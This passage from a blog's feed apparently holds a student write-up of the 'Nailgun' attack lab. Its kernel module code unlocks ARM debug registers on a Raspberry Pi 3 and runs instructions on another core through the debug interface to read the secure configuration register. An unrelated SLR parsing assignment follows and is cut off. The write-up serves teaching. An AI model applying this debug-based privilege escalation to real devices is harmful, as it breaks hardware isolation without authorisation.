tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/kernel.h&gt;</span></span><span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/init.h&gt;</span></span><span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;asm/io.h&gt;</span></span><span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a></span><span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> __init dbgauth_init<span class="op">(</span><span class="dt">void</span><span class="op">){</span></span><span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uint32_t</span> reg<span class="op">;</span></span><span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO<span class="st">&quot;dbgauth_module: init - attempt to read DBGAUTHSTATUS</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span><span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a></span><span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* 读取 DBGAUTHSTATUS:</span></span><span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="co">         * MRC p14, 0, &lt;Rt&gt;, c7, c14, 6</span></span><span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="co">         */</span></span><span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>        asm <span class="dt">volatile</span><span class="op">(</span><span class="st">&quot;mrc p14, 0, %0, c7, c14, 6&quot;</span> <span class="op">:</span> <span class="st">&quot;=r&quot;</span><span class="op">(</span>reg<span class="op">));</span></span><span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO<span class="st">&quot;dbgauth_module: DBGAUTHSTATUS = 0x</span><span class="sc">%08x\n</span><span class="st">&quot;</span><span class="op">,</span> reg<span class="op">);</span></span><span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>        </span><span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span><span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span><span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a></span><span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> __exit dbgauth_exit<span class="op">(</span><span class="dt">void</span><span class="op">){</span></span><span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO <span class="st">&quot;dbgauth_module: exit</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span><span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span><span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a></span><span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a>module_init<span class="op">(</span>dbgauth_init<span class="op">);</span></span><span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>module_exit<span class="op">(</span>dbgauth_exit<span class="op">);</span></span></code></pre></div><p>We can get DBGAUTHSTATUS after installing this kernel module</p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t3_2.png" /></p><blockquote><p>Task 3.b : What kind of debug events are enabled?</p></blockquote><table><thead><tr><th>Field</th><th>Bits</th><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td>SNID</td><td>7–6</td><td>11</td><td>Secure Non-invasive debug enabled</td></tr><tr><td>SID</td><td>5–4</td><td>11</td><td>Secure Invasive debug enabled</td></tr><tr><td>NSNID</td><td>3–2</td><td>11</td><td>Non-secure Non-invasive debug enabled</td></tr><tr><td>NSID</td><td>1–0</td><td>11</td><td>Non-secure Invasive debug enable</td></tr></tbody></table><h5 id="task-4-enable-the-halting-debug">Task 4: Enable the HaltingDebug</h5><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_1.png" /></p><p>We can find that <code>EDLAR_OFFSET=0xFB0</code></p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_3.png" /></p><p>Write the key value to unlock</p><div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>debug_register <span class="op">+</span> EDLAR_OFFSET<span class="op">);</span></span><span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>cti_register <span class="op">+</span> EDLAR_OFFSET<span class="op">);</span></span></code></pre></div><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_2.png" /></p><p>We can find that <code>OSLAR_OFFSET=0x300</code></p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_4.png" /></p><p>Writing 0 to the <code>OSLK</code> bit unlocks the OS,</p><div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>iowrite32<span class="op">(</span><span class="dv">0</span><span class="op">,</span> param<span class="op">-&gt;</span>debug_register <span class="op">+</span> OSLAR_OFFSET<span class="op">);</span></span><span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>iowrite32<span class="op">(</span><span class="dv">0</span><span class="op">,</span> param<span class="op">-&gt;</span>cti_register <span class="op">+</span> OSLAR_OFFSET<span class="op">);</span></span></code></pre></div><h5 id="task-5-switch-to-the-el3-and-read-the-scr">Task 5: Switch to theEL3 and read the SCR</h5><p>​ Task5.a: We mention how to access SCR directly in Task2. You need toprepare an instruction, who reads SCR and store it to R1. Then convertit to machine code(do it on yourself) and execute it on the target.</p><pre class="assembly"><code>mrc p15,0,R1,c1,c1,0</code></pre><p>use <ahref="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">OnlineAssembler and Disassembler</a> to assemble this instruction. It yields<code>\x11\x1f\x11\xee</code> (Little Endian).</p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/T5_a.png" /></p><blockquote><p>Note: In <strong>EDITR</strong>, <code>hw2</code> (bits [31:16]) isthe second halfword and <code>hw1</code> (bits [15:0]) is the firsthalfword of the T32 instruction. They are displayed in a nonstandardorder (hw2 on the left, hw1 on the right).</p></blockquote><p>In terms of a 32-bit value for C code execution:</p><div class="sourceCode" id="cb11"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 0xee111f11 &lt;=&gt; mrc p15,0,R1,c1,c1,0</span></span><span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>execute_ins_via_itr<span class="op">(</span>param<span class="op">-&gt;</span>debug_register<span class="op">,</span> <span class="bn">0x1f11ee11</span><span class="op">);</span></span></code></pre></div><p>​ Task 5.b: After you finish Task 5.a , you need to transfer the valuein R1 on core0, to the local variable scr. It will be printed later.DBGDTRTXint and DBGDTRTX would be helpful in your implementation</p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t5_b.png" /></p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t5_b_2.png" /></p><p><strong>DBGDTRTXint</strong> is a 32-bit debug register that allowsthe processor to transfer data to an external debugger. It is accessedusing the <strong>MCR instruction</strong>, for example:</p><pre class="assembly"><code>MCR p14, 0, Rt, c0, c5, 0</code></pre><p>In terms of a 32-bit value for C code execution:</p><div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co">// ee001e15 &lt;=&gt; mcr p14,0,R1,c0,c5,0</span></span><span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>execute_ins_via_itr<span class="op">(</span>param<span class="op">-&gt;</span>debug_register<span class="op">,</span> <span class="bn">0x1e15ee00</span><span class="op">);</span></span></code></pre></div><p>Register DBGDTRTXint bits [31:0] are architecturally mapped toDBGDTRTX_EL0[31:0].</p><div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>scr <span class="op">=</span> ioread32<span class="op">(</span>param<span class="op">-&gt;</span>debug_register <span class="op">+</span> DBGDTRTX_OFFSET<span class="op">);</span></span></code></pre></div><h5 id="task-6-restore-the-context-and-exit">Task 6: Restore the Contextand Exit</h5><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t6.png" /></p><p>The value of SCR is<code>0x00000131</code>(<code>0b100110001</code>)</p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t6_2.png" /></p><p><strong>Key meanings of SCR = 0x131</strong></p><ul><li><p>PE is in Non-secure state.</p></li><li><p>An FIQ taken from either Security state is masked by PSTATE.F.When PSTATE.F is 0, the FIQ is taken to EL3.</p></li><li><p>External aborts taken from either Security state are masked byPSTATE.A. When PSTATE.A is 0, the abort is taken to EL3.</p></li><li><p>HVC instructions are enabled at Non-secure EL1 and EL2.</p></li></ul><h5 id="question-1">Question 1:</h5><p>During this lab, what is the base address of Cross Trigger Interfacein Raspberry Pi 3? Can your find the global address of CTICONTROLregister in Raspberry Pi 3 according to the Arm Reference Manual? Answerthe address value and show your calculation. (hint: Find the offset)</p><div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 0x40038000 is the base address of the cross trigger interface registers on Core 0</span></span><span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define CTI_REGISTER_ADDR </span><span class="bn">0x40038000</span></span></code></pre></div><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q1.png" /></p><p>The global address of the <strong>CTICONTROL</strong> register iscalculated as:</p><p><span class="math display">$$\begin{aligned} \text{Global Address} &amp;= \text{Base Address} +\text{Offset} \\ &amp;= 0\text{x}40038000 + 0\text{x}0 \\ &amp;=\mathbf{0\text{x}40038000} \end{aligned}$$</span></p><p>Therefore, the <strong>CTICONTROL register is located at address0x40038000.</strong></p><h5 id="question-2">Question 2:</h5><p>Do we have another way to unlock the OS Lock in this lab exceptmemory mapping? If yes, how to do that? Justify your answer.</p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q2.png" /></p><p>Extract Step 1 (the part that unlocks debug and cross-triggerregisters) from the <code>read_scr()</code> function, and modify it sothat instead of unlocking the OS Lock, it <strong>locks</strong> it.</p><div class="sourceCode" id="cb16"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> read_scr1<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>addr<span class="op">){</span></span><span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Step 1: Unlock debug and cross trigger reigsters</span></span><span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> nailgun_param <span class="op">*</span>param <span class="op">=</span> <span class="op">(</span><span class="kw">struct</span> nailgun_param<span class="op">*)</span>addr<span class="op">;</span></span><span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>    printk<span class="op">(</span>KERN_INFO<span class="st">&quot;Step 1: Unlock debug and cross trigger registers</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span><span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>    iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>debug_register <span class="op">+</span> EDLAR_OFFSET<span class="op">);</span></span><span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>    iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>cti_register <span class="op">+</span> EDLAR_OFFSET<span class="op">);</span></span><span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>    printk<span class="op">(</span>KERN_INFO<span class="st">&quot;Step 1(Add): Lock OS registers</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span><span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>    iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>debug_register <span class="op">+</span> OSLAR_OFFSET<span class="op">);</span></span><span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>    iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>cti_register <span class="op">+</span> OSLAR_OFFSET<span class="op">);</span></span><span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>unlock the OS Lock <strong>by executing the code directly on core0.</strong></p><div class="sourceCode" id="cb17"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> unlock_debug<span class="op">(</span><span class="dt">void</span><span class="op">*</span> _<span class="op">)</span> <span class="op">{</span></span><span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Unlock self debug registers</span></span><span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>    printk<span class="op">(</span>KERN_INFO <span class="st">&quot;Step 1(Add): unlock the OS Lock not using MAP</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span><span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uint32_t</span> reg <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span><span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>    asm <span class="dt">volatile</span><span class="op">(</span><span class="st">&quot;mcr p14, 0, %0, c1, c0, 4&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>reg<span class="op">));</span></span><span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>Change <code>nailgun_init</code> <strong>as follows:</strong></p><div class="sourceCode" id="cb18"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>smp_call_function_single<span class="op">(</span><span class="dv">1</span><span class="op">,</span>read_scr1<span class="op">,</span>param<span class="op">,</span><span class="dv">1</span><span class="op">);</span></span><span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>smp_call_function_single<span class="op">(</span><span class="dv">0</span><span class="op">,</span> unlock_debug<span class="op">,</span> param<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span><span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>smp_call_function_single<span class="op">(</span><span class="dv">1</span><span class="op">,</span>read_scr<span class="op">,</span>param<span class="op">,</span><span class="dv">1</span><span class="op">);</span></span></code></pre></div><p>Therefore, we can unlock the OS Lock in this lab except memorymapping</p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q2_2.png" /></p>]]></content>
    
    
    <summary type="html">&lt;h5 id=&quot;task-1-create-and-install-a-kernel-module&quot;&gt;Task 1: Create and
Install a Kernel Module&lt;/h5&gt;
&lt;p&gt;simple_module.c&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;/* simple_module.c */&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;linux/module.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;linux/kernel.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;linux/init.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;asm/io.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; __init simple_module_init&lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;        printk&lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;Helloworld.&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&#92;n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt; *The cleanup function of the module.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt; */&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; __exit simple_module_exit&lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-16&quot;&gt;&lt;a href=&quot;#cb1-16&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-17&quot;&gt;&lt;a href=&quot;#cb1-17&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;        printk&lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;KERN_INFO&lt;span class=&quot;st&quot;&gt;&amp;quot;Exit.&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&#92;n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-18&quot;&gt;&lt;a href=&quot;#cb1-18&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-19&quot;&gt;&lt;a href=&quot;#cb1-19&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;module_init&lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;simple_module_init&lt;span class=&quot;op&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-20&quot;&gt;&lt;a href=&quot;#cb1-20&quot; aria-hidden=&quot;true&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;module_exit&lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;simple_module_exit&lt;span class=&quot;op&quot;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="Computer Science" scheme="https://www.sky-learner.top/categories/Computer-Science/"/>
    
    
    <category term="Security" scheme="https://www.sky-learner.top/tags/Security/"/>
    
    <category term="Linux" scheme="https://www.sky-learner.top/tags/Linux/"/>
    
    <category term="Attack" scheme="https://www.sky-learner.top/tags/Attack/"/>
    
    <category term="ARM" scheme="https://www.sky-learner.top/tags/ARM/"/>
    
  </entry>
  
  <entry>
    <title>CS323 Written Assignment 4 - SLR, CLR, and LALR Parsing</title>
    <link href="https://www.sky-learner.top/2025/11/CS323-Assignment-4/"/>
    <id>https://www.sky-learner.top/2025/11/CS323-Assignment-4/</id>
    <published>2025-11-26T04:00:00.000Z</published>
    <updated>2025-11-27T04:02:56.095Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Exercise 1:</strong> Consider the following grammar G, whichyou have seen in the previous assignment:</p><pre><code>E -&gt; TXX -&gt; +E | εT -&gt; FYY -&gt; T | εF -&gt; PZZ -&gt; *Z | εP -&gt; (E) | a | b</code></pre><p><strong>1. </strong>Please construct the SLR parsing table for G. Isthe grammar SLR(1)?</p><table><colgroup><col style="width: 24%" /><col style="width: 37%" /><col style="width: 37%" /></colgroup><thead><tr><th style="text-align: center;"><strong>(Non-Terminal)</strong></th><th style="text-align: center;"><strong>FIRST Set</strong></th><th style="text-align: center;"><strong>FOLLOW Set</strong></th></tr></thead><tbody><tr><td style="text-align: center;"><strong>E</strong></td><td style="text-align: center;"><spanclass="math inline">{(,<em>a</em>, <em>b</em>}</span></td><td style="text-align: center;"><spanclass="math inline">{$, )}</span></td></tr><tr><td style="text-align: center;"><strong>T</strong></td><td style="text-align: center;"><spanclass="math inline">{(,<em>a</em>, <em>b</em>}</span></td><td style="text-align: center;"><spanclass="math inline">{$, ), +}</span></td></tr><tr><td style="text-align: center;"><strong>X</strong></td><td style="text-align: center;"><spanclass="math inline">{<em>ε</em>, +}</span></td><td style="text-align: center;"><spanclass="math inline">{$, )}</span></td></tr><tr><td style="text-align: center;"><strong>F</strong></td><td style="text-align: center;"><spanclass="math inline">{(,<em>a</em>, <em>b</em>}</span></td><td style="text-align: center;"><spanclass="math inline">{$, (,), +, <em>a</em>, <em>b</em>}</span></td></tr><tr><td style="text-align: center;"><strong>Y</strong></td><td style="text-align: center;"><spanclass="math inline">{<em>ε</em>, (,<em>a</em>, <em>b</em>}</span></td><td style="text-align: center;"><spanclass="math inline">{$, ), +}</span></td></tr><tr><td style="text-align: center;"><strong>P</strong></td><td style="text-align: center;"><spanclass="math inline">{(,<em>a</em>, <em>b</em>}</span></td><td style="text-align: center;"><spanclass="math inline">{$, (,), *, +, <em>a</em>, <em>b</em>}</span></td></tr><tr><td style="text-align: center;"><strong>Z</strong></td><td style="text-align: center;"><spanclass="math inline">{<em>ε</em>, *}</span></td><td style="text-align: center;"><spanclass="math inline">{$, (,), +, <em>a</em>, <em>b</em>}</span></td></tr></tbody></table><span id="more"></span><p><span class="math display">$$\begin{aligned}(1) &amp; \quad E \to TX \\(2) &amp; \quad X \to +E \\(3) &amp; \quad X \to \varepsilon \\(4) &amp; \quad T \to FY \\(5) &amp; \quad Y \to T \\(6) &amp; \quad Y \to \varepsilon \\(7) &amp; \quad F \to PZ \\(8) &amp; \quad Z \to *Z \\(9) &amp; \quad Z \to \varepsilon \\(10) &amp; \quad P \to (E) \\(11) &amp; \quad P \to a \\(12) &amp; \quad P \to b\end{aligned}$$</span></p><p>Augmented grammar: Introduce a new symbol E’ and add a new production<code>E' -&gt; E</code></p><pre><code>I0 = closure({[E&#39;-&gt;•E]})   = {[E&#39;-&gt;•E], [E-&gt;•TX], [T-&gt;•FY], [F-&gt;•PZ], [P-&gt;•(E)], [P-&gt;•a], [P-&gt;•b]}I1 = closure(GOTO(I0, E))   = closure({[E&#39;-&gt;E•]})   = {[E&#39;-&gt;E•]}I2 = closure(GOTO(I0, T))   = closure({[E-&gt;T•X]})   = {[E-&gt;T•X], [X-&gt;•+E], [X-&gt;•]}I3 = closure(GOTO(I0, F))   = closure({[T-&gt;F•Y]})   = {[T-&gt;F•Y], [Y-&gt;•T], [Y-&gt;•], [T-&gt;•FY], [F-&gt;•PZ], [P-&gt;•(E)], [P-&gt;•a], [P-&gt;•b]}I4 = closure(GOTO(I0, P))   = closure({[F-&gt;P•Z]})   = {[F-&gt;P•Z], [Z-&gt;•*Z], [Z-&gt;•]}I5 = closure(GOTO(I0, ( ))   = closure({[P-&gt;(•E)]})   = {[P-&gt;(•E)], [E-&gt;•TX], [T-&gt;•FY], [F-&gt;•PZ], [P-&gt;•(E)], [P-&gt;•a], [P-&gt;•b]}I6 = closure(GOTO(I0, a))   = closure({[P-&gt;a•]})   = {[P-&gt;a•]}I7 = closure(GOTO(I0, b))   = closure({[P-&gt;b•]})   = {[P-&gt;b•]}I8 = closure(GOTO(I2, X))   = closure({[E-&gt;TX•]})   = {[E-&gt;TX•]}I9 = closure(GOTO(I2, +))   = closure({[X-&gt;+•E]})   = {[X-&gt;+•E], [E-&gt;•TX], [T-&gt;•FY], [F-&gt;•PZ], [P-&gt;•(E)], [P-&gt;•a], [P-&gt;•b]}I10 = closure(GOTO(I3, Y))    = closure({[T-&gt;FY•]})    = {[T-&gt;FY•]}I11 = closure(GOTO(I3,T))    = closure({[Y-&gt;T•]})    = {[Y-&gt;T•]}I3 = closure(GOTO(I3, F))   = closure({T-&gt;F•Y})I4 = closure(GOTO(I3, P))   = closure({[F-&gt;P•Z]})I5 = closure(GOTO(I3, ( ))   = closure({[P-&gt;(•E)]})I6 = closure(GOTO(I3, a))I7 = closure(GOTO(I3, b))I12 = closure(GOTO(I4, Z))    = closure({[F-&gt;PZ•]})    = {[F-&gt;PZ•]}I13 = closure(GOTO(I4, *))    = closure({Z-&gt;*•Z})    = {[Z-&gt;*•Z], [Z-&gt;•*Z], [Z-&gt;•]}I14 = closure(GOTO(I5, E))    = closure({[P-&gt;(E•)]})    = {[P-&gt;(E•)]}I2 = closure(GOTO(I5, T))I3 = closure(GOTO(I5, F))I4 = closure(GOTO(I5, P))I5 = closure(GOTO(I5, ( )I6 = closure(GOTO(I5, a))I7 = closure(GOTO(I5, b))I15 = closure(GOTO(I9, E))    = closure({[X-&gt;+E•]})    = {[X-&gt;+E•]}I2 = closure(GOTO(I9, T))I3 = closure(GOTO(I9, F))I4 = 